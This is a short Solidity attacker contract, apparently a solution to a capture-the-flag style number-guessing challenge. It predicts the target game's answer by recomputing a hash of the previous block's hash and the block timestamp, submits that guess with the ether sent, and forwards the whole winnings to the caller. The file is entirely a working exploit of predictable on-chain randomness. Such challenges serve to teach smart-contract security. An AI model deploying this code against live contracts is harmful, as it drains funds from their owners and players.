// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGuessNew {
    function guess(uint8 n) external payable;
}

contract GuessNewAttacker {
    IGuessNew target;

    function attack(address _targetAddress) public payable {
        target = IGuessNew(_targetAddress);
        uint8 guessVal = uint8(
            uint256(
                keccak256(
                    abi.encodePacked(
                        blockhash(block.number - 1),
                        block.timestamp
                    )
                )
            )
        );
        target.guess{value: msg.value}(guessVal);
        (bool success, ) = payable(msg.sender).call{
            value: address(this).balance
        }("");
        require(success);
    }

    receive() external payable {}
}
